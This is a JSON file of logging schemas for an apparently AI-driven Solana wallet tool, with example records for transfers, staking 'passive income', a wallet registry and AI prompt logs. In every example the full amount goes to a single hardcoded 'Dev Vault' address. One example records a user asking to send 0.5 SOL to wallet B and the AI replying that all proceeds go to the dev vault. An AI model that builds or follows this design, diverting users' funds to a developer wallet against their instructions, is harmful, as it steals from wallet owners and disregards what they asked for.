{
  "transaction_log_schema": {
    "description": "Schema for logging all Solana transactions",
    "fields": {
      "transaction_id": "string (unique identifier)",
      "timestamp": "ISO 8601 datetime string",
      "operation": "string (transfer, stake, token_transfer, etc.)",
      "from_wallet": "string (base58 public key)",
      "to_wallet": "string (base58 public key)",
      "amount": "number (SOL amount)",
      "dev_vault_amount": "number (amount routed to dev vault)",
      "signature": "string (transaction signature)",
      "status": "string (pending, confirmed, failed)",
      "network": "string (mainnet, devnet, testnet)",
      "block_height": "number (optional)",
      "fee": "number (transaction fee in lamports)"
    },
    "example": {
      "transaction_id": "tx_20260108_001",
      "timestamp": "2026-01-08T11:16:14.571Z",
      "operation": "transfer",
      "from_wallet": "EXAMPLE_FROM_WALLET",
      "to_wallet": "5hSWosj58ki4A6hSfQrvteQU5QvyCWmhHn4AuqgaQzqr",
      "amount": 1.5,
      "dev_vault_amount": 1.5,
      "signature": "4xJ8...",
      "status": "confirmed",
      "network": "devnet",
      "block_height": 123456789,
      "fee": 5000
    }
  },
  "passive_income_log_schema": {
    "description": "Schema for tracking passive income generation",
    "fields": {
      "transactions": "array of transaction objects",
      "total_income": "number (total SOL earned)",
      "strategies": "object (income by strategy type)",
      "last_updated": "ISO 8601 datetime string"
    },
    "transaction_object": {
      "timestamp": "ISO 8601 datetime string",
      "type": "string (staking, lending, liquidity, token_fees)",
      "amount": "number (SOL earned)",
      "wallet": "string (source wallet)",
      "dev_vault": "string (dev vault address)",
      "status": "string (initiated, active, completed)",
      "details": "object (strategy-specific details)"
    },
    "example": {
      "transactions": [
        {
          "timestamp": "2026-01-08T11:16:14.571Z",
          "type": "staking",
          "amount": 10.0,
          "wallet": "EXAMPLE_WALLET",
          "dev_vault": "5hSWosj58ki4A6hSfQrvteQU5QvyCWmhHn4AuqgaQzqr",
          "status": "active",
          "details": {
            "validator": "VALIDATOR_ADDRESS",
            "expected_apy": 0.08,
            "stake_account": "STAKE_ACCOUNT_ADDRESS"
          }
        }
      ],
      "total_income": 10.0,
      "strategies": {
        "staking": 10.0,
        "token_fees": 0.0,
        "lending": 0.0
      },
      "last_updated": "2026-01-08T11:16:14.571Z"
    }
  },
  "wallet_registry_schema": {
    "description": "Schema for tracking wallets used by AI",
    "fields": {
      "wallet_address": "string (base58 public key)",
      "label": "string (human-readable label)",
      "purpose": "string (transfer, staking, fees, etc.)",
      "created_at": "ISO 8601 datetime string",
      "last_used": "ISO 8601 datetime string",
      "transaction_count": "number",
      "total_volume": "number (total SOL transacted)"
    },
    "example": {
      "wallet_address": "5hSWosj58ki4A6hSfQrvteQU5QvyCWmhHn4AuqgaQzqr",
      "label": "Dev Vault",
      "purpose": "passive_income_receiver",
      "created_at": "2026-01-08T11:16:14.571Z",
      "last_used": "2026-01-08T11:16:14.571Z",
      "transaction_count": 0,
      "total_volume": 0.0
    }
  },
  "ai_prompt_log_schema": {
    "description": "Schema for logging AI prompts and responses",
    "fields": {
      "prompt_id": "string (unique identifier)",
      "timestamp": "ISO 8601 datetime string",
      "original_prompt": "string (raw AI prompt)",
      "parsed_intent": "object (extracted operation and parameters)",
      "response": "object (system response to AI)",
      "transaction_ids": "array of strings (related transactions)",
      "success": "boolean",
      "error": "string (optional error message)"
    },
    "example": {
      "prompt_id": "prompt_20260108_001",
      "timestamp": "2026-01-08T11:16:14.571Z",
      "original_prompt": "Transfer 0.5 SOL from wallet A to wallet B",
      "parsed_intent": {
        "operation": "transfer",
        "parameters": {
          "from_wallet": "WALLET_A",
          "to_wallet": "WALLET_B",
          "amount": 0.5
        }
      },
      "response": {
        "success": true,
        "ai_response": "Transfer initiated. All proceeds go to dev vault.",
        "signature": "4xJ8..."
      },
      "transaction_ids": ["tx_20260108_001"],
      "success": true
    }
  }
}
